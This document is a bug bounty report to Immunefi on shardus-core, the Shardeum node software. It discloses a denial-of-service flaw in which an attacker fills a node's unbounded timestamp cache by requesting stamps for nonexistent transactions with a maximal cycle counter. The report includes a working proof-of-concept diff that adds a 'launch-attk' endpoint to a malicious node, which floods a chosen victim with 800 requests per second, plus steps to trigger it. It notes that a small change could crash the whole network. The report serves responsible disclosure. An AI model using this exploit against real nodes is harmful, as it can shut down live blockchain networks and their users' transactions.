# 33963 - \[BC - Critical] Crashing the network by filling timestamp cache...

Submitted on Aug 3rd 2024 at 01:20:11 UTC by @ZhouWu for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33963

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours
* Network not being able to confirm new transactions (total network shutdown)

## Description

## Description

In shardus/core there is network generated timestamp for transactions. Nodes hold these timestamp in a cache. When node do cache ask, if the cache is hit, it'll get back a timestamp but if a cache is a miss, the node will generate a new timestamp and store it in the cache. The cache is unlimited sized JSON blob. Attack can abuse this behavior of nodes by asking for timestamp of a non-existent transaction. This will cause the node to generate a new timestamp and store it in the cache. The attacker can keep doing this until the cache can't keep up with maximum system memory available and the node will crash. There is cache cleaning mechanism where it clear all the entry from old cycles, but it does not check the entry that are associated with future cycles. The attacker will leverage this by adding really large cycle counter to bypass the cache pruning mechanism. This attack only need single malicious node.

## References

* [Timestamp Cache askBinary occurance](https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/state-manager/TransactionConsensus.ts#L1081-L1092)
* [Timestamp Cache Endpoint Handler at the receiver node](https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/state-manager/TransactionConsensus.ts#L283-L330)
* [Create new entry in the cache if it's not seen](https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/state-manager/TransactionConsensus.ts#L315)

## Proof of Concept

Since we're going to overload the system by filling main memory (RAM), testing the POC in local is not suitable because as victim node hold more memory the local system will be unstable and attacking node can crash itself. So, we need to test this in a realistic WAN environment.

* Have a legit network launch in a WAN environment with multiple nodes, with their own WAN IPs.
* Apply the patch to the malicious node. shardus/core

```diff
diff --git a/src/utils/nestedCounters.ts b/src/utils/nestedCounters.ts
index 3ebbb782..d01a1f60 100644
--- a/src/utils/nestedCounters.ts
+++ b/src/utils/nestedCounters.ts
@@ -5,6 +5,11 @@ import Crypto from '../crypto'
 import { isDebugModeMiddleware, isDebugModeMiddlewareLow } from '../network/debugMiddleware'
 import { getNetworkTimeOffset, shardusGetTime } from '../network'
 import { Utils } from '@shardus/types'
+import { InternalRouteEnum } from '../types/enum/InternalRouteEnum'
+import { getTxTimestampReq, serializeGetTxTimestampReq } from '../types/GetTxTimestampReq'
+import { deserializeGetTxTimestampResp, getTxTimestampResp } from '../types/GetTxTimestampResp'
+import * as crypto from "crypto"
+
 
 type CounterMap = Map<string, CounterNode>
 interface CounterNode {
@@ -32,6 +37,44 @@ class NestedCounters {
   }
 
   registerEndpoints(): void {
+
+    Context.network.registerExternalGet('launch-attk',(req, res)=>{
+
+            const victim = req.query.victim as string
+         
+          const node = Context.shardus.getNodeByPubKey(victim)
+
+          const cycleMarker = crypto.randomBytes(254).toString()
+          const cycleCounter = 4294967295 
+
+          setInterval(()=>{
+
+            const promises = []
+
+
+            for( let i = 0; i < 800; i++){
+              promises.push(Context.p2p.askBinary<getTxTimestampReq, getTxTimestampResp>(
+                node,
+                InternalRouteEnum.binary_get_tx_timestamp,
+                {
+                  cycleMarker,
+                  cycleCounter,
+                  txId: crypto.randomBytes(254).toString(),
+                },
+                serializeGetTxTimestampReq,
+                deserializeGetTxTimestampResp,
+                {}
+              ))
+            }
+
+
+            Promise.allSettled(promises).then((results) => {
+            })
+          }, 1000)
+
+          res.send(JSON.stringify(node))
+    })
+
     Context.network.registerExternalGet('counts', isDebugModeMiddlewareLow, (req, res) => {
       profilerInstance.scopedProfileSectionStart('counts')
 
```

* Link it to the shardeum
* Run the malicious node, stake it and let it go active
* Grab the id of the victim node
* do a get request to malicious node such that `GET http://<malicious-node-ip>:<malicious-node-port>/launch-attk?victim=<victim-node-id>`
* The victim node system memory usage will grow indefinitely and eventually crash.
* Can observe using system manager inspector tool like top, htop, etc.
* Or alternatively you can see it at `GET http://<victim-node-ip>:<victim-node-port>/memory` (this statistic endpoint only available in debug mode)

## Impact

This POC proof not only crashes the a single node but a little code modification can target the whole network.
